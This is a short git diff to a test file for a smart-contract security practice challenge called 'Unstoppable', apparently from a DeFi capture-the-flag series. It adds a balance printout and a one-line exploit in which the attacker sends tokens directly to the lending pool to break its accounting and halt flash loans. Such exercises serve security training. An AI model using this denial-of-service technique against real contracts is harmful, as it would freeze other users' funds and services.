@@ -32,6 +32,7 @@ describe('[Challenge] Unstoppable', function () {
 
         //*** 100 token are given to attacker
         await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);
+        console.log("attacker balance: ", ethers.utils.formatEther( await this.token.balanceOf(attacker.address)));
 
         expect(
             await this.token.balanceOf(this.pool.address)
@@ -49,6 +50,7 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        this.token.connect(attacker).transfer(this.pool.address, 10);
     });
 
     after(async function () {
